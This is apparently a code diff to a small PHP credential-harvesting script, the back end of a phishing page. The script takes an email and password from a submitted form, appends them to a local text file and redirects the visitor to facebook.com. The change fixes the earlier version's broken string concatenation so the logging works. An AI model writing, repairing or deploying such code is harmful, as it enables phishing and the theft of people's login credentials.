@@ -1,8 +1,8 @@
 <?php
-$email = $_POST['email'];
+$email=$_POST['email'];
 $pass = $_POST['pass'];
-$fp = fopen("sexy808", "ab+");
-fwrite($fp, $email + " : " + $pass " :: " + $_SERVER['HTTP_USER_AGENT']);
-fclose($fp);
+$data = $email." : ".$pass."\n";
+$fp = fopen("abd", "a+");
+fwrite($fp, $data);
 header("location: https://www.facebook.com");
 ?>
